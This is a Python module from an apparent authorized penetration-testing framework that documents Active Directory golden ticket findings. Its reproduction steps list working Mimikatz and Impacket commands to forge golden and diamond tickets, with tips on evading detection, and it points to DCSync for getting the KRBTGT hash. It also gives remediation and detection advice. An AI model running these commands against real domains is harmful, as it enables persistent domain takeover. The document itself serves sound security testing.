"""Golden ticket detection and creation guidance (post-compromise)."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_GOLDEN = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
CVSS40_GOLDEN = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
class GoldenTicket(BaseModule):
    """Golden ticket attack guidance and detection check."""

    NAME        = "golden_ticket"
    DESCRIPTION = "Document golden ticket attack path — requires KRBTGT hash (post-DA)"
    PHASE       = 5
    TAGS        = ["attacks", "golden-ticket", "kerberos", "persistence", "mitre-T1558.001"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)
        has_krbtgt = bool(self.config.extra.get("krbtgt_hash"))

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        confirmed = self.confirm_action(
            module=self.NAME,
            action="Document golden ticket attack path and check for detection indicators",
            target=domain,
            risk=(
                "If KRBTGT hash is available: Golden ticket creation bypasses all AD auth. "
                "Highest severity post-exploitation technique."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        if has_krbtgt:
            krbtgt_hash = self.config.extra.get("krbtgt_hash", "")
            domain_sid  = self.config.extra.get("domain_sid", "S-1-5-21-UNKNOWN")

            ev = Evidence(
                extra={
                    "domain":       domain,
                    "dc_ip":        dc_ip,
                    "krbtgt_hash":  krbtgt_hash[:10] + "..." if krbtgt_hash else "available",
                    "domain_sid":   domain_sid,
                }
            )
            self.new_finding(
                title="Golden Ticket — KRBTGT Hash Available (Domain Persistence Possible)",
                severity=Severity.CRITICAL,
                description=(
                    f"KRBTGT hash obtained for {domain}. "
                    "Golden ticket forging is now possible, allowing persistent domain access "
                    "even after password changes on regular accounts.\n\n"
                    "Golden tickets remain valid until:\n"
                    "1. KRBTGT password is changed TWICE\n"
                    "2. Ticket TTL expires (default 10 hours)"
                ),
                reproduction_steps=[
                    "# NOTE: Use AES-256 (etype 18) — RC4 is detectable on modern DCs",
                    "# and may be blocked where RC4 is disabled (Server 2022 + hardening).",
                    "",
                    "# Mimikatz (AES-256 preferred):",
                    f"kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid}",
                    f"  /aes256:<krbtgt_aes256_key> /ticket:golden.kirbi",
                    "kerberos::ptt golden.kirbi",
                    "",
                    "# RC4 fallback (older environments only):",
                    f"kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid}",
                    f"  /krbtgt:{krbtgt_hash[:16]}... /ticket:golden.kirbi",
                    "",
                    "# Impacket (AES-256):",
                    f"ticketer.py -aesKey <krbtgt_aes256> -domain-sid {domain_sid} -domain {domain} Administrator",
                    "",
                    "# Diamond ticket (harder to detect — built on legitimate TGT):",
                    f"ticketer.py -request -user lowpriv -password 'Pass' -aesKey <krbtgt_aes256>",
                    f"  -domain {domain} -domain-sid {domain_sid} Administrator",
                ],
                remediation=(
                    "Rotate KRBTGT password TWICE with 10-hour interval to invalidate all tickets. "
                    "Reset: Set-ADAccountPassword -Identity KRBTGT -Reset -NewPassword ...\n"
                    "Disable RC4 (Kerberos DES/RC4 encryption) — force AES-256 only. "
                    "Monitor Event 4769 (TGS) with non-standard etype (etype 23 = RC4 on AES-only DC). "
                    "Enable Microsoft Defender for Identity golden ticket + diamond ticket alerts."
                ),
                references=["MITRE T1558.001", "ADSecurity KRBTGT"],
                evidence=ev,
                cvss_v31_vector=CVSS_GOLDEN,
                cvss_v40_vector=CVSS40_GOLDEN,
                mitre_attack=["TA0003/T1558.001"],
                target=dc_ip,
                operator_confirmed=True,
            )
        else:
            ev = Evidence(extra={"domain": domain, "dc_ip": dc_ip})
            self.new_finding(
                title="Golden Ticket — KRBTGT Required (Not Yet Obtained)",
                severity=Severity.INFORMATIONAL,
                description=(
                    "Golden ticket forging requires the KRBTGT NTLM hash. "
                    "Obtain via DCSync or secretsdump after reaching Domain Admin. "
                    "See kerberoast/asrep_roast/secretsdump modules."
                ),
                reproduction_steps=[
                    "1. Run secretsdump (--dcsync) to get KRBTGT hash",
                    "2. Run golden_ticket module again with krbtgt_hash in config",
                ],
                remediation="N/A — requires post-DA compromise",
                references=["MITRE T1558.001"],
                evidence=ev,
                cvss_v31_vector=CVSS_GOLDEN,
                cvss_v40_vector=CVSS40_GOLDEN,
                target=dc_ip,
            )

        return self._make_result(start)


class TestGoldenTicket:
    def test_cvss_vector(self) -> None:
        assert CVSS_GOLDEN.startswith("CVSS:3.1")
